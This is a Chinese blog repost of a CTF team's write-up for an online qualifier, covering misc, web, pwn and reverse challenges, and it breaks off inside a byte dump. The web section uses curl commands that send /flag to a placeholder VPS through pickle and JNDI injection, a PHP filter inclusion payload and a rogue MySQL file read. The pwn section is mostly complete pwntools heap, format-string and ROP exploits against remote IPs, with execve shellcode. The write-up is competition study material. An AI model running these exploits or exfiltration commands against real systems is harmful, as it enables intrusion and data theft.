又是个48h的比赛，线上赛其实和拟态防御关系不大，看起来决赛才是真拟态（ 这次比赛喵喵是和 SU 战队的师傅们一起打的，最后队友成功带飞，打到了第二名。 由于这周末比赛有点多，这个比赛喵喵只是随便看了看 misc 题目这样，主要还是队友在出力，队友们辛苦了，Orz！ 这里直接把战队的 writeup 转过来了喵~ （如果转过来的时候哪里锅了可以去看原文 本次强网拟态防御国际精英挑战赛我们 SU 取得了线上赛 2nd 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770) 以下是我们 SU 本次 强网拟态防御国际精英挑战赛 的 writeup。 作者: Suers链接: https://team-su.github.io/passages/2021-10-24-NTFY/来源: team-su.github.io著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 miscweirdphoto爆破高宽，进而得到字符串：TIEWOFTHSAEOUIITNRBCOSHSTSAN 附上爆破脚本 import binascii import struct crcbp = open(\"1.png\", \"rb\").read() for i in range(2000): for j in range(2000): data = crcbp[12:16] + struct.pack('&gt;i', i)+struct.pack('&gt;i', j)+crcbp[24:29] crc32 = binascii.crc32(data) &amp; 0xffffffff if(crc32 == 0x9E916964): print('hex:', hex(i), hex(j)) #hex: 0x58c 0x1f4 接着就纯靠猜不断尝试最后确认是栅栏密码（key=4）得到压缩包密码：THISISTHEANSWERTOOBSFUCATION 解压查看文件头很明显这是一个pdf文件，010更改下pdf头 最后通过工具wbs43open解密得到flag：flag{th1s_ls_thE_f1n4l_F14g_y0u_want} bluewhale追踪tcp流发现了password：th1sIsThEpassw0rD 接着我们进行明文攻击得到压缩包密码：!2b$3&amp;Ec 最后lsb隐写得到flag：flag{F1nallY_y0uve_f0unD_1t} bar 参考文章：https://blog.csdn.net/kzhuangood/article/details/72953354 首先分离GIF提取出每一帧，接着我们规定黑为1，白为0，灰为空格，摩斯密码得到提示：CODE93 1010 111 100 0 11110 00011 CODE93 然后还是按黑1白0来，每九个为一组对照code93编码表得到： F0C62DB973684DBDA896F9C5F6D962 （后面还有一大块空白的是需要我们去算的效验位 接着我们通过在线网站输入条码号生成条形码，而它这校验位其实是已经自动算出来的，我们只要根据其结构即可得到最后两位 hint：1、观察得到字符串在code93在线网站生成的条形码停止字符的前两位字符 2、flag内容都是小写英文字母 最后根据hint得知应该是小写的，进而得知最后两位校验码为U和M 大写情况： 101000100 101101100 111010010 101011110 1 2 W SPACE * Start/Stop 终止条 小写情况： 101000100 110010110 101001100 101011110 1 2 U M * Start/Stop 终止条 整理得到flag：flag{f0c62db973684dbda896f9c5f6d962um} mirror010打开原图拉到尾部也发现了png头，并且发现把图片数据每16一组倒过来也是一张图片，脚本倒置一下 data = open('full.png', 'rb').read() data = data[::-1] data = [data[i:i+16][::-1] for i in range(0, len(data), 16)] # print(data[0]) print(len(data)) res = b''.join(data) f = open('flag.png', 'wb') f.write(res) f.close() 跟原图看起来一模一样，那么考虑盲水印，但crc校验出错，修一下两张图的crc跑盲水印 倒置一下，修一修图看起来更清晰 然后根据hint替换其中某些字符即可 flag{356ffd89983749059ab1e3e968a01d90} webzerocalc访问题目 readFile('./src/index.js') 说flag在root目录，但是名字是随机的，但是其实并没有随机，readFile('/flag') flag{Hf4ulmUeLzShDRRfHdS4E8UhrlYbyMM6} new_hospital随便点点能够找到feature.php?id=2，发现文件包含 除此之外还发现会给cookie赋值(url+base64解码之后就是读取的文件了)： 但是不管些什么都会被强制加上后缀js，所以就没有太大意义，于是就扫目录，扫出有old目录和flag.php old目录发现依然是这个站(猜测是该题目考点就是老站迁移未及时删除旧文件带来的问题)，但是发现id没办法修改读取的文件，是根据cookie来获取读取的文件的，并且不会增加后缀，那么就直接修cookie读取/var/www/html/flag.php即可 ezpickle简单的pickle反序列化，给了个过滤是必须config模块下的属性且不能有双下划线，config有个后门： notadmin={\"admin\":\"no\"} def backdoor(cmd): if notadmin[\"admin\"]==\"yes\": s=''.join(cmd) eval(s) 分别获取backdoor和notadmin，给notadmin的admin赋值为yes，pker直接构造就行了，curl外带一下：利用pker编写exp backdoor = GLOBAL(\"config\",\"backdoor\") notadmin = GLOBAL(\"config\",\"notadmin\") notadmin[\"admin\"] = \"yes\" backdoor(\"__import__('os').system('curl -F file=@/flag http://vps:port')\") easy-filter&lt;?php ini_set(\"open_basedir\",\"./\"); if(!isset($_GET['action'])){ highlight_file(__FILE__); die(); } if($_GET['action'] == 'w'){ @mkdir(\"./files/\"); $content = $_GET['c']; $file = bin2hex(random_bytes(5)); file_put_contents(\"./files/\".$file,base64_encode($content)); echo \"./files/\".$file; }elseif($_GET['action'] == 'r'){ $r = $_GET['r']; $file = \"./files/\".$r; include(\"php://filter/resource=$file\"); } 有include，所以想到的是执行代码用system来绕basedir读flag。 前面file_put_contents会写入base64，后面的filter用base64，因为会拼接上files: php://filter/resource=./files/file_name 但常见的一个filter格式如下： php://filter/read=string.toupper/resource 遂想到将resource=./files/file_name这一段当做filter参数的一部分，因此有： read=convert.base64-encode/resource= 拼接为 php://filter/resource=./files/read=convert.base64-encode/resource= 先写 c=&lt;?php echo system('cat /flag');?&gt; 再包含即可： read=convert.base64-decode/resource=/../../xxxxxx jack-shiro红明谷杯原题: https://www.zhaoj.in/read-6859.html ，参考其操作在VPS上搭建工具即可： 运行： java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'curl http://vps:1234 -F file=@/flag' 得到flag give-me-your-0day这题比赛的时候卡了很久，一开始以为是反序列化，但是这里没办法绕过： 因为题目是共享环境，所以安装肯定是没办法安装的，于是另寻思路，想到恶意mysql构造任意文件读取。利用工具：https://github.com/Al1ex/Rogue-MySql-Server/blob/master/rogue_mysql_server.py 在vps上搭建，但是直接连接的时候发现PDO的LOCAL DATA无法使用： 翻看源码发现可以使用mysqli进行连接： 所以抓包更换一下即可 dbAdapter=Mysqli&amp;dbHost=vps&amp;dbPort=port&amp;dbUser=root&amp;dbPassword=rooot&amp;dbDatabase=typecho&amp;dbCharset=utf8&amp;dbPrefix=typecho_&amp;userUrl=http%3A%2F%2F121.36.229.59%3A32768&amp;userName=admin&amp;userPassword=&amp;userMail=webmaster%40yourdomain.com&amp;action=config 得到flag： pwnbornote2.31 offbynull #encoding:utf-8 from pwn import * context.terminal = ['tmux','sp','-h'] context.log_level = 'DEBUG' # sh = process('./bornote') sh = remote('121.36.250.162',49154) # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') libc = ELF('./libc-2.31.so') def menu(choice): sh.recvuntil(\"cmd: \") sh.sendline(str(choice)) def add(size): menu(1) sh.recvuntil(\"Size: \") sh.sendline(str(size)) def edit(idx, content): menu(3) sh.recvuntil(\"Index: \") sh.sendline(str(idx)) sh.recvuntil(\"Note: \") sh.sendline(content) def delete(idx): menu(2) sh.recvuntil(\"Index: \") sh.sendline(str(idx)) def show(idx): menu(4) sh.recvuntil(\"Index: \") sh.sendline(str(idx)) sh.recvuntil(\"Note: \") data = sh.recv(6) return data sh.recvuntil(\"name:\") sh.sendline('aaa') add(0x418) #0 fake-&gt;fd b390 add(0x128) #1 add(0x418) #2 add(0x438) #3 target bd00 add(0x148) #4 add(0x428) # 5 fake-&gt;bk c290 add(0x138) # 6 delete(0) delete(3) delete(5) # delete(2) #2 &amp; 3 unlink add(0x438) # 0 set size edit(0,b'a' * 0x418 + p64(0xb01)[:7]) add(0x418) # 2 c20 add(0x428) # 3 bk 190 add(0x418) # 5 fd 290 delete(5) delete(2) add(0x418) # 2 partial overwrite bk -&gt; 9c00 edit(2,b'\\x01' * 8) add(0x418) # 5 c20 delete(5) delete(3) add(0x5f8) # 3 chunk into largebin add(0x428) # 5 partial overwrite fd edit(5,b'') add(0x418) # 7 c20 ## 触发offbynull 向前合并 # gdb.attach(sh,'b * $rebase(0x1781)') add(0x108) #8 gap edit(8,p64(0) + p64(0x111)) edit(6, b'\\x01' * 0x138) #offbynull edit(6, b'\\x01' * 0x130 + p64(0xb00)) #prev_size delete(3) ## edit(1,'/bin/sh\\x00') add(0x10) #3 # show(7) libc_base = u64(show(7).ljust(8,b'\\x00')) - 0x1EBBE0 log.success(\"libc_base = \" + hex(libc_base)) fake_fast = 0x1EBB3D + libc_base # gdb.attach(sh,'b * $rebase(0x1E16)') add(0x128) #9 delete(1) delete(9) edit(7,p64(libc_base + libc.symbols[\"__free_hook\"])) add(0x128) add(0x128) #9 edit(0,'/bin/sh\\x00') edit(9,p64(libc_base + libc.symbols[\"system\"])) sh.sendline('2') sh.sendline('0') sh.interactive() pwnpwn格式化字符串 栈溢出 # _*_ coding:utf-8 _*_ from pwn import * context.log_level = 'debug' context.arch = 'amd64' context.terminal=['/usr/bin/tmux', 'splitw', '-h'] prog = './pwnpwn' s = lambda data :p.send(data) sa = lambda delim,data :p.sendafter(delim, data) sl = lambda data :p.sendline(data) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda numb=4096 :p.recv(numb) ru = lambda delims, drop=True :p.recvuntil(delims, drop) it = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) bp = lambda bkp :pdbg.bp(bkp) li = lambda str1,data1 :log.success(str1+'========&gt;'+hex(data1)) #p = process(prog)#env={\"LD_PRELOAD\":\"./libc.so.6\"}) libc = ELF(\"./libc-2.23.so\") p = remote(\"124.71.156.217\",49153) def dbg(): gdb.attach(p) def debug(addr,PIE=True): debug_str = \"\" if PIE: text_base = int(os.popen(\"pmap {}| awk '{{print $1}}'\".format(p.pid)).readlines()[1], 16) for i in addr: debug_str+='b *{}\\n'.format(hex(text_base+i)) gdb.attach(p,debug_str) else: for i in addr: debug_str+='b *{}\\n'.format(hex(i)) gdb.attach(p,debug_str) sl('1') ru('0x') data = int(r(12),16) print hex(data) exe = data - 0x9b9 sl('2') ru(\"hello\\n\") #debug([0xa07]) sl('%3$p+%27$p') addr=int(ru(\"+\",drop=True),16)-(0x7f3c9335d360-0x7f3c93266000) canary=int(ru(\"\\n\",drop=True),16) print hex(addr) print hex(canary) #-------------------------- libc = ELF(\"./libc-2.23.so\") pop_rdi=0x21112+addr sh=libc.search(\"/bin/sh\").next()+addr sys=addr+libc.sym['system'] pay='a'*0x68+p64(canary)+'attack\\x00\\x00'+p64(pop_rdi)+p64(sh)+p64(sys) sl(pay) # dbg() it() bitflipoff-by-one # _*_ coding:utf-8 _*_ from pwn import * context.log_level = 'debug' context.terminal=['tmux', 'splitw', '-h'] prog = './bitflip' #elf = ELF(prog)#nc 121.36.194.21 49155 #p = process(prog)#,env={\"LD_PRELOAD\":\"./libc-2.27.so\"}) libc = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\") p = remote(\"124.71.130.185\", 49155)#nc 124.71.130.185 49155 def debug(addr,PIE=True): debug_str = \"\" if PIE: text_base = int(os.popen(\"pmap {}| awk '{{print $1}}'\".format(p.pid)).readlines()[1], 16) for i in addr: debug_str+='b *{}\\n'.format(hex(text_base+i)) gdb.attach(p,debug_str) else: for i in addr: debug_str+='b *{}\\n'.format(hex(i)) gdb.attach(p,debug_str) def dbg(): gdb.attach(p) #----------------------------------------------------------------------------------------- s = lambda data :p.send(str(data)) #in case that data is an int sa = lambda delim,data :p.sendafter(str(delim), str(data)) sl = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) r = lambda numb=4096 :p.recv(numb) ru = lambda delims, drop=True :p.recvuntil(delims, drop) it = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) bp = lambda bkp :pdbg.bp(bkp) li = lambda str1,data1 :log.success(str1+'========&gt;'+hex(data1)) def dbgc(addr): gdb.attach(p,\"b*\" + hex(addr) +\"\\n c\") def lg(s,addr): print('\\033[1;31;40m%20s--&gt;0x%x\\033[0m'%(s,addr)) sh_x86_18=\"\\x6a\\x0b\\x58\\x53\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\" sh_x86_20=\"\\x31\\xc9\\x6a\\x0b\\x58\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\" sh_x64_21=\"\\xf7\\xe6\\x50\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x48\\x89\\xe7\\xb0\\x3b\\x0f\\x05\" def choice(idx): sla(\"Your choice: \",str(idx)) def add(idx,sz): choice(1) sla(\"Index: \",idx) sla(\"Size: \",sz) # sa(\"content?\",cno) def delete(idx): choice(4) sla(\"Index: \",idx) def show(idx): choice(3) sla(\"Index: \",idx) def edit(idx,con): choice(2) sla(\"Index: \",idx) # sla(\"size?\",sz) sa(\"Content: \",con) def exp(): #debug([0x7B9]) add(0,0x48) add(1,0x20) add(2,0x30) add(3,0x30) edit(0,0x48*'a'+p8(0x51)) delete(1) delete(3) delete(2) add(1,0x48) edit(1,0x30*'a'+'\\n') show(1) ru('a'*0x30) data = uu64(r(6)) heap = data - 0x555711a7c30a + 0x555711a7c000 lg('heap',heap) #----------------------------------- edit(1,'b'*0x20+p64(0)+p64(0x41)+p64(data+22)+'\\n') add(4,0x28) add(5,0x40) add(6,0x50) for i in range(13): add(i+7,0x50) add(31,0x28) add(30,0x20) add(29,0x30) add(28,0x30) add(27,0x30) delete(29) delete(28) delete(27) edit(6,p64(0)+p64(0x551-0x80)+'\\n') edit(31,0x28*'c'+p8(0x61)) delete(30) add(30,0x50) edit(30,0x28*'d'+p64(0x41)+p64(heap+0x3f0)+'\\n') add(27,0x30) add(28,0x30) delete(28) edit(6,0xf*'x'+'\\n') show(6) ru('x\\n') data = uu64(r(6)) addr = data - 0x7ff81693aca0 + 0x7ff81654f000 lg('addr',addr) sys = addr + libc.sym['system'] fh = addr + libc.sym['__free_hook'] edit(6,p64(0)+p64(0x4d1)+p64(data)*2+p64(fh)+'\\n') #----------------------------------------- add(21,0x10) delete(7) add(22,0x40) edit(22,'x'*0x20+p64(0)+p64(0x61)+p64(fh)+'\\n') add(23,0x50) add(24,0x50) edit(24,p64(sys)+'\\n') edit(0,'/bin/sh\\x00\\n') delete(0) # dbg() it() if __name__ == '__main__': exp() oldschooloff-by-one # _*_ coding:utf-8 _*_ from pwn import * context.log_level = 'debug' context.terminal=['tmux', 'splitw', '-h'] prog = './old_school' #elf = ELF(prog)#nc 121.36.194.21 49155 #p = process(prog)#,env={\"LD_PRELOAD\":\"./libc-2.27.so\"}) libc = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\") p = remote(\"121.36.194.21\", 49155)#nc 123.60.63.90 6888 def debug(addr,PIE=True): debug_str = \"\" if PIE: text_base = int(os.popen(\"pmap {}| awk '{{print $1}}'\".format(p.pid)).readlines()[1], 16) for i in addr: debug_str+='b *{}\\n'.format(hex(text_base+i)) gdb.attach(p,debug_str) else: for i in addr: debug_str+='b *{}\\n'.format(hex(i)) gdb.attach(p,debug_str) def dbg(): gdb.attach(p) #----------------------------------------------------------------------------------------- s = lambda data :p.send(str(data)) #in case that data is an int sa = lambda delim,data :p.sendafter(str(delim), str(data)) sl = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) r = lambda numb=4096 :p.recv(numb) ru = lambda delims, drop=True :p.recvuntil(delims, drop) it = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) bp = lambda bkp :pdbg.bp(bkp) li = lambda str1,data1 :log.success(str1+'========&gt;'+hex(data1)) def dbgc(addr): gdb.attach(p,\"b*\" + hex(addr) +\"\\n c\") def lg(s,addr): print('\\033[1;31;40m%20s--&gt;0x%x\\033[0m'%(s,addr)) sh_x86_18=\"\\x6a\\x0b\\x58\\x53\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\" sh_x86_20=\"\\x31\\xc9\\x6a\\x0b\\x58\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\" sh_x64_21=\"\\xf7\\xe6\\x50\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x48\\x89\\xe7\\xb0\\x3b\\x0f\\x05\" #https://www.exploit-db.com/shellcodes #----------------------------------------------------------------------------------------- def choice(idx): sla(\"Your choice: \",str(idx)) def add(idx,sz): choice(1) sla(\"Index: \",idx) sla(\"Size: \",sz) # sa(\"content?\",cno) def delete(idx): choice(4) sla(\"Index: \",idx) def show(idx): choice(3) sla(\"Index: \",idx) def edit(idx,con): choice(2) sla(\"Index: \",idx) # sla(\"size?\",sz) sa(\"Content: \",con) def exp(): #debug([0x7B9]) add(0,0x38) add(1,0x10) add(2,0x80) add(3,0x80) add(4,0x28) add(5,0x20) add(6,0x50) # add() for i in range(7): add(i+10,0x80) for i in range(7): delete(i+10) # delete(0) pay = 'a'*0x38 + p8(0x81) edit(0,pay) delete(1) add(1,0x70) delete(2) edit(1,0x20*'b'+'\\n') show(1) ru('b'*0x20) data = uu64(r(6)) lg('data',data) addr = data - 0x00007ff4965d5c0a + 0x7ff4961ea000 lg('addr',addr) sys = addr + libc.sym['system'] fh = addr + libc.sym['__free_hook'] #edit(1,0x10*'d'+p64(0)+p64(0x91)+p64(data)*2+'\\n') #----------------------------------------------------- edit(4,0x28*'c'+p8(0x71)) delete(5) delete(6) add(5,0x60) edit(5,0x20*'x'+p64(0)+p64(0x61)+p64(fh)+'\\n') add(6,0x50) add(0x1f,0x50) edit(6,'/bin/sh\\x00'+'\\n') edit(0x1f,p64(sys)+'\\n') delete(6) # dbg() it() if __name__ == '__main__': exp() old-school-revenge2.27 off by null from pwn import* r=remote(\"123.60.63.39\",49155) #r=process('./main') context.log_level='debug' libc=ELF('./libc-2.27.so') def new(idx,size): r.recvuntil(\": \") r.sendline(\"1\") r.recvuntil(\": \") r.sendline(str(idx)) r.recvuntil(\": \") r.sendline(str(size)) def edit(idx,content): r.recvuntil(\": \") r.sendline(\"2\") r.recvuntil(\": \") r.sendline(str(idx)) r.recvuntil(\": \") r.send(content) def show(idx): r.recvuntil(\": \") r.sendline(\"3\") r.recvuntil(\": \") r.sendline(str(idx)) def delete(idx): r.recvuntil(\": \") r.sendline(\"4\") r.recvuntil(\": \") r.sendline(str(idx)) for i in range(11): new(i,0xB8) for i in range(4,11): delete(i) delete(0) delete(1) delete(2) for i in range(4,11): new(i,0xB8) new(0,0xB8) edit(0,'\\x00'*0xb8) new(1,0xB8) new(2,0x38) for i in range(4,11): delete(i) delete(1) delete(3) for i in range(4,11): new(i,0xB8) new(1,0xB8) show(2) libc_base=u64(r.recvuntil('\\x7f')[-6:]+p16(0))-libc.sym['__malloc_hook']-0x70 success(\"libc_base: \"+hex(libc_base)) new(12,0x38) delete(2) edit(12,p64(libc_base+libc.sym['__free_hook'])+'\\n') new(2,0x38) new(13,0x38) edit(13,p64(libc_base+libc.sym['system'])+'\\n') edit(0,'/bin/sh\\x00\\n') delete(0) #gdb.attach(r) r.interactive() random-heapUaf from pwn import* r=remote(\"124.71.140.198\",49155) #r=process('./main') context.log_level='debug' libc=ELF('./libc-2.27.so') def new(idx,size): r.recvuntil(': ') r.sendline(\"1\") r.recvuntil(': ') r.sendline(str(idx)) r.recvuntil(': ') r.sendline(str(size)) def edit(idx,content): r.recvuntil(': ') r.sendline(\"2\") r.recvuntil(': ') r.sendline(str(idx)) r.recvuntil(': ') r.send(content) def show(idx): r.recvuntil(': ') r.sendline(\"3\") r.recvuntil(': ') r.sendline(str(idx)) def delete(idx): r.recvuntil(': ') r.sendline(\"4\") r.recvuntil(': ') r.sendline(str(idx)) new(0,0x100) new(1,0x18) delete(0) edit(0,p64(0)*2) delete(0) edit(0,'a'*0x8) show(0) heap=u64(r.recvline()[:-1][-6:]+p16(0))-0x10 success(\"heap: \"+hex(heap)) for i in range(6): edit(0,p64(0)*2) delete(0) #new(2,0x100) r.recvuntil(': ') r.sendline(\"0\"*0x500) show(0) libc_base=u64(r.recvuntil('\\x7f')[-6:]+p16(0))-libc.sym['__malloc_hook']-0x70 libc_base=libc_base//0x1000*0x1000 success(\"libc_base: \"+hex(libc_base)) delete(1) edit(1,p64(libc_base+libc.sym[\"__free_hook\"])) for i in range(0x20): new(2,0x18) edit(2,p64(libc_base+libc.sym['system'])) new(3,0x18) edit(3,'/bin/sh\\x00') #gdb.attach(r) delete(3) r.interactive() oldecho格式化字符串改stdout的fileno为2就可以正常输出 from pwn import* r=remote(\"123.60.32.152\",49154) #r=process('./main') context.log_level='debug' libc=ELF(\"./libc-2.23.so\") r.recvuntil(\"Gift: \") stack=int(r.recvline(),16) success(\"stack: \"+hex(stack)) r.recvline() r.sendline(\"%\"+str(stack%0x100-0x20)+\"c%6$hhn\") r.sendline(\"%\"+str(0xA90)+\"c%10$hn\") stack=stack-0x110 success(\"stack: \"+hex(stack)) r.sendline(\"%\"+str((stack+0xa0)%0x100)+\"c%14$hhn\") r.sendline(\"%\"+str(0x90)+\"c%40$hhn\") r.sendline(\"%\"+str(0x2)+\"c%29$hhn\") r.recv(2) r.sendline(\"%13$p;%9$p;\") libc_base=int(r.recvuntil(';',drop=True),16)-libc.sym[\"__libc_start_main\"]-240 pie=int(r.recvuntil(';',drop=True),16) pop_rax=libc_base+0x3a738 pop_rdi=libc_base+0x21112 pop_rsi=libc_base+0x202f8 pop_rdx=libc_base+0x1b92 syscall=libc_base+0xbc3f5 payload='' payload+=p64(pop_rax)+p64(2)+p64(pop_rdi)+p64(pie+0xb0+0x20)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(syscall) payload+=p64(pop_rax)+p64(0)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(libc_base+libc.sym['environ'])+p64(pop_rdx)+p64(0x30)+p64(syscall) payload+=p64(pop_rax)+p64(1)+p64(pop_rdi)+p64(2)+p64(syscall) payload+='flag' r.sendline(\"%\"+str((stack-0x8)%0x100)+\"c%6$hhn\") r.recv() r.sendline(\"%\"+str(0xedd)+\"c%10$hn\") r.recv() r.sendline(\"%\"+str((stack-0x10)%0x100)+\"c%6$hhn\") r.recv() #gdb.attach(r,'b printf') r.sendline((\"%\"+str(0x3f)+\"c%10$hhn\").ljust(0x18,'\\x00')+payload) r.interactive() sonic溢出 # _*_ coding:utf-8 _*_ from pwn import * context.log_level = 'debug' context.terminal=['tmux', 'splitw', '-h'] prog = './sonic' #elf = ELF(prog) #p = process(prog)#,env={\"LD_PRELOAD\":\"./libc-2.27.so\"}) #libc = ELF(\"/usr/lib/x86_64-linux-gnu/libc-2.31.so\") p = remote(\"123.60.63.90\", 6889)#nc 123.60.63.90 6888 def debug(addr,PIE=True): debug_str = \"\" if PIE: text_base = int(os.popen(\"pmap {}| awk '{{print $1}}'\".format(p.pid)).readlines()[1], 16) for i in addr: debug_str+='b *{}\\n'.format(hex(text_base+i)) gdb.attach(p,debug_str) else: for i in addr: debug_str+='b *{}\\n'.format(hex(i)) gdb.attach(p,debug_str) def dbg(): gdb.attach(p) #----------------------------------------------------------------------------------------- s = lambda data :p.send(str(data)) #in case that data is an int sa = lambda delim,data :p.sendafter(str(delim), str(data)) sl = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) r = lambda numb=4096 :p.recv(numb) ru = lambda delims, drop=True :p.recvuntil(delims, drop) it = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) bp = lambda bkp :pdbg.bp(bkp) li = lambda str1,data1 :log.success(str1+'========&gt;'+hex(data1)) def dbgc(addr): gdb.attach(p,\"b*\" + hex(addr) +\"\\n c\") def lg(s,addr): print('\\033[1;31;40m%20s--&gt;0x%x\\033[0m'%(s,addr)) sh_x86_18=\"\\x6a\\x0b\\x58\\x53\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\" sh_x86_20=\"\\x31\\xc9\\x6a\\x0b\\x58\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\" sh_x64_21=\"\\xf7\\xe6\\x50\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x48\\x89\\xe7\\xb0\\x3b\\x0f\\x05\" def exp(): #debug([0x7B9]) ru(\"ss=0x\") data = int(r(12),16) lg('data',data) pop_rdi = data - 0x7CF + 0x00000000000008c3 pop_rsi = data - 0x7cf + 0x00000000000008c1 execve = data - 0x7cf + 0x610 arg = data - 0x7cf + 0x201040 pay = '/bin/sh\\x00'*5 + p64(pop_rdi) + p64(arg) + p64(pop_rsi)+p64(0)*2+ p64(execve) sl(pay) it() if __name__ == '__main__': exp() revmarmgicarmv7 32逆向000103E8主要逻辑，接受的字符串为hex的形式（例如420a…）疑似为虚拟机题？ 将读入的字符串转换成数字，然后在这些switch里面使用对应的函数，每个函数做的事情本质为各个数组的轮转存储（例如第一个函数会处理进行a[0],b[0],c[0],d[0] -&gt; b[0],c[0],d[0],a[0]，然后数组自增3，再次交换）总共有6个数组，每个数组有9个数字本质魔方题，可以看这个地方 例如0x10的操作实际上相当于魔方这个操作 题目最终check的时候，分成了两部检查面是否为对应的面 大约相当于计算这两个值（如图） 0 2 4 6 8 为斜对角（蓝色）1 3 4 5 7 为十字边（黄色）4被用了两次（绿色)用此算法确定唯一的面。根据上面的式子我们可以得知以下条件 当前有6个数组（54个数字），分别象征着一个面 每次输入的十六进制是一个转动操作 由于此时分别计算十字边和斜对角，于是此时可以退化成一个组合问题，也就是 从54个数字中取出5个，让其答案等于对应值，于是可以写出爆破代码，得到每个面的最终状态。 之后在解题过程中发现，最后的check逻辑似乎导致整个题目不需要【真正求出转动思路】： 最后会将最终魔方的面和一个指定的另一个类似魔方的数组进行相乘相加，最终会得到目标字符串。虽然上一步我们【只能求出每个面所需的数字，但是无法求出顺序】，而这边的最终计算与顺序相关，但是【由于可以分别考虑十字，斜对角，中间方块】三种情况，此时爆破变成可能。 最终可以爆破得到flag fastjs依照这个 https://bbs.pediy.com/thread-258985.htm 链接可以知道 跟之前长安杯和看雪KCTF题目差不多 先用脚本恢复一下符号 0x02, 0x3A, 0x10, 0x6C, 0x6F, 0x6E, 0x67, 0x32, 0x73, 0x74, 0x72, 0x10, 0x73, 0x74, 0x72, 0x32, 0x6C, 0x6F, 0x6E, 0x67, 0x10, 0x73, 0x64, 0x66, 0x73, 0x66, 0x73, 0x64, 0x66, 0x0E, 0x73, 0x74, 0x72, 0x32, 0x48, 0x65, 0x78, 0x0E, 0x68, 0x65, 0x78, 0x32, 0x73, 0x74, 0x72, 0x0C, 0x78, 0x78, 0x78, 0x66, 0x73, 0x73, 0x08, 0x6D, 0x61, 0x69, 0x6E, 0x08, 0x61, 0x72, 0x67, 0x73, 0x82, 0x01, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x2B, 0x2F, 0x3D, 0x0E, 0x5F, 0x6B, 0x65, 0x79, 0x53, 0x74, 0x72, 0x0A, 0x64, 0x66, 0x73, 0x66, 0x73, 0x14, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x41, 0x72, 0x67, 0x73, 0x0A, 0x73, 0x68, 0x69, 0x66, 0x74, 0x0A, 0x65, 0x72, 0x72, 0x6F, 0x72, 0x20, 0x2E, 0x2F, 0x74, 0x65, 0x73, 0x74, 0x5F, 0x65, 0x6E, 0x63, 0x6F, 0x64, 0x65, 0x2E, 0x6A, 0x73, 0x02, 0x76, 0x02, 0x77, 0x04, 0x76, 0x6C, 0x04, 0x73, 0x6C, 0x02, 0x69, 0x18, 0x66, 0x72, 0x6F, 0x6D, 0x43, 0x68, 0x61, 0x72, 0x43, 0x6F, 0x64, 0x65, 0x12, 0x73, 0x75, 0x62, 0x73, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x02, 0x73, 0x06, 0x6C, 0x65, 0x6E, 0x14, 0x63, 0x68, 0x61, 0x72, 0x43, 0x6F, 0x64, 0x65, 0x41, 0x74, 0x06, 0x73, 0x74, 0x72, 0x06, 0x6B, 0x65, 0x79, 0x02, 0x6B, 0x02, 0x6E, 0x02, 0x7A, 0x02, 0x79, 0x0A, 0x64, 0x65, 0x6C, 0x74, 0x61, 0x04, 0x6D, 0x78, 0x02, 0x65, 0x02, 0x71, 0x06, 0x73, 0x75, 0x6D, 0x02, 0x70, 0x0A, 0x66, 0x6C, 0x6F, 0x6F, 0x72, 0x0C, 0x6F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x08, 0x63, 0x68, 0x72, 0x31, 0x10, 0x70, 0x61, 0x72, 0x73, 0x65, 0x49, 0x6E, 0x74, 0x0C, 0x73, 0x75, 0x62, 0x73, 0x74, 0x72, 0x08, 0x63, 0x68, 0x72, 0x32, 0x08, 0x63, 0x68, 0x72, 0x33, 